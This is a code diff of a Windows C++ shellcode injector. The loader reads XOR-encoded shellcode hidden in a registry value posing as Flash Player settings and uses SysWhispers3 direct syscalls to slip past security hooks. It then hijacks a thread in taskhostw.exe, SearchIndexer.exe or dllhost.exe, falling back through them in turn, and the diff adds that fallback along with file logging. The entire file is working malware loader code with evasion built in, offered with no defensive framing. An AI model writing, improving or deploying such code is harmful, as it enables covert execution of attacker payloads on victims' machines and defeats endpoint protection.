@@ -1,9 +1,6 @@
 // injector.cpp
-// Thread-hijack shellcode injector using SysWhispers3 (jumper_randomized).
-// - Shellcode read from HKCU\Software\Macromedia\FlashPlayer\Config (REG_BINARY)
-// - Value stored XOR'd with 0x6B by PowerShell, we XOR again to recover it
-// - Hijacks an existing thread in explorer.exe (no CreateRemoteThread)
-// - Fully silent: no console, no prints.
+// Thread-hijack shellcode injector — multi-target fallback
+// Tries: taskhostw.exe -> SearchIndexer.exe -> dllhost.exe
 
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
@@ -11,6 +8,7 @@
 #include <stdlib.h>
 #include <time.h>
 #include <vector>
+#include <stdio.h>
 
 #include "syscalls.h"
 
@@ -22,41 +20,67 @@
 #define XOR_KEY             0x6B
 #define REG_SUBKEY          L"Software\\Macromedia\\FlashPlayer"
 #define REG_VALUE_NAME      L"Config"
-#define TARGET_PROCESS      L"RuntimeBroker.exe"
+
+static const wchar_t* TARGETS[] = {
+    L"taskhostw.exe",
+    L"SearchIndexer.exe",
+    L"dllhost.exe",
+};
+static const int TARGET_COUNT = 3;
 
 // -----------------------------------------------------------------------------
-// Read the XOR'd shellcode from the registry
+// Logger fichier
 // -----------------------------------------------------------------------------
-static std::vector<BYTE> ReadShellcodeFromRegistry()
-{
-    std::vector<BYTE> shellcode;
-    HKEY hKey = nullptr;
-
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_SUBKEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
-        return shellcode;
-
-    DWORD type = 0;
-    DWORD size = 0;
-    if (RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, &type, nullptr, &size) != ERROR_SUCCESS
-        || type != REG_BINARY || size == 0)
-    {
-        RegCloseKey(hKey);
-        return shellcode;
-    }
-
-    shellcode.resize(size);
-    if (RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, nullptr, shellcode.data(), &size) != ERROR_SUCCESS)
-        shellcode.clear();
-
-    RegCloseKey(hKey);
-    return shellcode;
+static void logmsg(const char* msg) {
+    FILE* f = fopen("C:\\Users\\Public\\injector_log.txt", "a");
+    if (!f) return;
+    fprintf(f, "%s\r\n", msg);
+    fclose(f);
+}
+static void loghex(const char* msg, unsigned long v) {
+    FILE* f = fopen("C:\\Users\\Public\\injector_log.txt", "a");
+    if (!f) return;
+    fprintf(f, "%s 0x%08lX\r\n", msg, v);
+    fclose(f);
+}
+static void logtarget(const wchar_t* name) {
+    FILE* f = fopen("C:\\Users\\Public\\injector_log.txt", "a");
+    if (!f) return;
+    fwprintf(f, L"--- trying %s ---\r\n", name);
+    fclose(f);
 }
 
 // -----------------------------------------------------------------------------
-// Helpers: toolhelp snapshot enumeration
+// Read XOR'd shellcode from registry
 // -----------------------------------------------------------------------------
-static DWORD FindTargetProcessId(const wchar_t* processName)
-{
+static std::vector<BYTE> ReadShellcodeFromRegistry() {
+    std::vector<BYTE> sc;
+    HKEY hKey = nullptr;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_SUBKEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+        return sc;
+
+    DWORD type = 0, size = 0;
+    if (RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, &type, nullptr, &size) != ERROR_SUCCESS
+        || type != REG_BINARY || size == 0) {
+        RegCloseKey(hKey);
+        return sc;
+    }
+
+    sc.resize(size);
+    if (RegQueryValueExW(hKey, REG_VALUE_NAME, nullptr, nullptr, sc.data(), &size) != ERROR_SUCCESS)
+        sc.clear();
+
+    RegCloseKey(hKey);
+    return sc;
+}
+
+// -----------------------------------------------------------------------------
+// Find PID by name, in OUR session only
+// -----------------------------------------------------------------------------
+static DWORD FindTargetProcessId(const wchar_t* name) {
+    DWORD mySession = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &mySession);
+
     DWORD pid = 0;
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
@@ -65,9 +89,12 @@ static DWORD FindTargetProcessId(const wchar_t* processName)
     pe.dwSize = sizeof(pe);
     if (Process32FirstW(snap, &pe)) {
         do {
-            if (_wcsicmp(pe.szExeFile, processName) == 0) {
-                pid = pe.th32ProcessID;
-                break;
+            if (_wcsicmp(pe.szExeFile, name) == 0) {
+                DWORD sess = 0;
+                if (ProcessIdToSessionId(pe.th32ProcessID, &sess) && sess == mySession) {
+                    pid = pe.th32ProcessID;
+                    break;
+                }
             }
         } while (Process32NextW(snap, &pe));
     }
@@ -75,9 +102,13 @@ static DWORD FindTargetProcessId(const wchar_t* processName)
     return pid;
 }
 
-static DWORD FindTargetThreadId(DWORD pid)
-{
-    DWORD tid = 0;
+// -----------------------------------------------------------------------------
+// Pick a thread, avoid the first one (usually UI/main thread)
+// -----------------------------------------------------------------------------
+static DWORD FindTargetThreadId(DWORD pid) {
+    DWORD tids[128];
+    int count = 0;
+
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
 
@@ -85,147 +116,147 @@ static DWORD FindTargetThreadId(DWORD pid)
     te.dwSize = sizeof(te);
     if (Thread32First(snap, &te)) {
         do {
-            if (te.th32OwnerProcessID == pid) {
-                tid = te.th32ThreadID;
-                break;
+            if (te.th32OwnerProcessID == pid && count < 128) {
+                tids[count++] = te.th32ThreadID;
             }
         } while (Thread32Next(snap, &te));
     }
     CloseHandle(snap);
-    return tid;
+
+    if (count == 0) return 0;
+    if (count == 1) return tids[0];
+    return tids[count / 2];   // middle thread
 }
 
 // -----------------------------------------------------------------------------
-// Entry point (silent, no console)
+// Inject shellcode into a given PID via thread hijack
 // -----------------------------------------------------------------------------
-int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int)
-{
-    // SysWhispers3 "jumper_randomized" uses rand() inside SW3_GetRandomSyscallAddress.
-    srand((unsigned int)time(nullptr) ^ GetTickCount());
-
-    // 1. Read + decode shellcode
-    std::vector<BYTE> shellcode = ReadShellcodeFromRegistry();
-    if (shellcode.empty()) return 1;
-
-    for (auto& b : shellcode) b ^= XOR_KEY;
-
-    // 2. Locate target process
-    DWORD pid = FindTargetProcessId(TARGET_PROCESS);
-    if (pid == 0) return 1;
-
+static bool InjectInto(DWORD pid, const std::vector<BYTE>& shellcode) {
     OBJECT_ATTRIBUTES oa;
     InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
 
-    // 3. NtOpenProcess
     HANDLE hProcess = nullptr;
     CLIENT_ID cid = {};
     cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
-    cid.UniqueThread  = nullptr;
 
     NTSTATUS status = Sw3NtOpenProcess(
         &hProcess,
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
-        &oa,
-        &cid);
+        &oa, &cid);
 
-    if (status < 0 || hProcess == nullptr) return 1;
+    if (status < 0 || !hProcess) { loghex("[X] NtOpenProcess", (unsigned long)status); return false; }
+    logmsg("[+] NtOpenProcess OK");
 
-    // 4. NtAllocateVirtualMemory
     PVOID remoteBase = nullptr;
     SIZE_T regionSize = shellcode.size();
-    status = Sw3NtAllocateVirtualMemory(
-        hProcess,
-        &remoteBase,
-        0,
-        &regionSize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE);
-
-    if (status < 0 || remoteBase == nullptr) {
-        Sw3NtClose(hProcess);
-        return 1;
+    status = Sw3NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &regionSize,
+                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (status < 0 || !remoteBase) {
+        loghex("[X] NtAllocateVirtualMemory", (unsigned long)status);
+        Sw3NtClose(hProcess); return false;
     }
+    logmsg("[+] NtAllocateVirtualMemory OK");
 
-    // 5. NtWriteVirtualMemory
-    SIZE_T bytesWritten = 0;
-    status = Sw3NtWriteVirtualMemory(
-        hProcess,
-        remoteBase,
-        shellcode.data(),
-        shellcode.size(),
-        &bytesWritten);
-
-    if (status < 0 || bytesWritten != shellcode.size()) {
-        Sw3NtClose(hProcess);
-        return 1;
+    SIZE_T written = 0;
+    status = Sw3NtWriteVirtualMemory(hProcess, remoteBase, (PVOID)shellcode.data(),
+                                     shellcode.size(), &written);
+    if (status < 0 || written != shellcode.size()) {
+        loghex("[X] NtWriteVirtualMemory", (unsigned long)status);
+        Sw3NtClose(hProcess); return false;
     }
+    logmsg("[+] NtWriteVirtualMemory OK");
 
-    // 6. NtProtectVirtualMemory -> RX
     ULONG oldProtect = 0;
-    status = Sw3NtProtectVirtualMemory(
-        hProcess,
-        &remoteBase,
-        &regionSize,
-        PAGE_EXECUTE_READ,
-        &oldProtect);
-
+    status = Sw3NtProtectVirtualMemory(hProcess, &remoteBase, &regionSize,
+                                       PAGE_EXECUTE_READ, &oldProtect);
     if (status < 0) {
-        Sw3NtClose(hProcess);
-        return 1;
+        loghex("[X] NtProtectVirtualMemory", (unsigned long)status);
+        Sw3NtClose(hProcess); return false;
     }
+    logmsg("[+] NtProtectVirtualMemory OK");
 
-    // 7. Find a thread to hijack
     DWORD tid = FindTargetThreadId(pid);
-    if (tid == 0) {
-        Sw3NtClose(hProcess);
-        return 1;
-    }
+    if (!tid) { logmsg("[X] no thread found"); Sw3NtClose(hProcess); return false; }
+    loghex("[+] target TID", tid);
 
     HANDLE hThread = nullptr;
     cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;
-
-    status = Sw3NtOpenThread(
-        &hThread,
+    status = Sw3NtOpenThread(&hThread,
         THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
-        &oa,
-        &cid);
-
-    if (status < 0 || hThread == nullptr) {
-        Sw3NtClose(hProcess);
-        return 1;
+        &oa, &cid);
+    if (status < 0 || !hThread) {
+        loghex("[X] NtOpenThread", (unsigned long)status);
+        Sw3NtClose(hProcess); return false;
     }
+    logmsg("[+] NtOpenThread OK");
 
-    // 8. Suspend, patch RIP, resume
-    ULONG prevSuspend = 0;
-    if (Sw3NtSuspendThread(hThread, &prevSuspend) < 0) {
-        Sw3NtClose(hThread); Sw3NtClose(hProcess);
-        return 1;
+    ULONG prev = 0;
+    if (Sw3NtSuspendThread(hThread, &prev) < 0) {
+        logmsg("[X] suspend failed");
+        Sw3NtClose(hThread); Sw3NtClose(hProcess); return false;
     }
 
     CONTEXT ctx{};
     ctx.ContextFlags = CONTEXT_FULL;
     if (Sw3NtGetContextThread(hThread, &ctx) < 0) {
-        Sw3NtResumeThread(hThread, &prevSuspend);
-        Sw3NtClose(hThread); Sw3NtClose(hProcess);
-        return 1;
+        logmsg("[X] getcontext failed");
+        Sw3NtResumeThread(hThread, &prev);
+        Sw3NtClose(hThread); Sw3NtClose(hProcess); return false;
     }
 
     ctx.Rip = (DWORD64)remoteBase;
     if (Sw3NtSetContextThread(hThread, &ctx) < 0) {
-        Sw3NtResumeThread(hThread, &prevSuspend);
-        Sw3NtClose(hThread); Sw3NtClose(hProcess);
-        return 1;
+        logmsg("[X] setcontext failed");
+        Sw3NtResumeThread(hThread, &prev);
+        Sw3NtClose(hThread); Sw3NtClose(hProcess); return false;
     }
 
-    if (Sw3NtResumeThread(hThread, &prevSuspend) < 0) {
-        Sw3NtClose(hThread); Sw3NtClose(hProcess);
-        return 1;
+    if (Sw3NtResumeThread(hThread, &prev) < 0) {
+        logmsg("[X] resume failed");
+        Sw3NtClose(hThread); Sw3NtClose(hProcess); return false;
     }
-
-    // Give the payload a moment to spin up before our loader exits.
-    Sleep(2000);
+    logmsg("[OK] thread hijacked, shellcode should run");
 
     Sw3NtClose(hThread);
     Sw3NtClose(hProcess);
-    return 0;
+    return true;
+}
+
+// -----------------------------------------------------------------------------
+// Entry
+// -----------------------------------------------------------------------------
+int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
+    srand((unsigned int)time(nullptr) ^ GetTickCount());
+    logmsg("=== INJECTOR START ===");
+
+    std::vector<BYTE> shellcode = ReadShellcodeFromRegistry();
+    if (shellcode.empty()) { logmsg("[X] no shellcode in registry"); return 1; }
+    loghex("[1] shellcode size", (unsigned long)shellcode.size());
+
+    for (auto& b : shellcode) b ^= XOR_KEY;
+    logmsg("[2] shellcode decoded");
+
+    for (int i = 0; i < TARGET_COUNT; i++) {
+        logtarget(TARGETS[i]);
+
+        DWORD pid = 0;
+        for (int attempt = 0; attempt < 20; attempt++) {
+            pid = FindTargetProcessId(TARGETS[i]);
+            if (pid) break;
+            Sleep(500);
+        }
+        if (!pid) { logmsg("[X] target not found, skipping"); continue; }
+
+        loghex("[3] target PID", pid);
+
+        if (InjectInto(pid, shellcode)) {
+            logmsg("[SUCCESS] payload injected, waiting 3s...");
+            Sleep(3000);
+            return 0;
+        }
+        logmsg("[!] injection failed, trying next target");
+    }
+
+    logmsg("[FAIL] all targets exhausted");
+    return 1;
 }
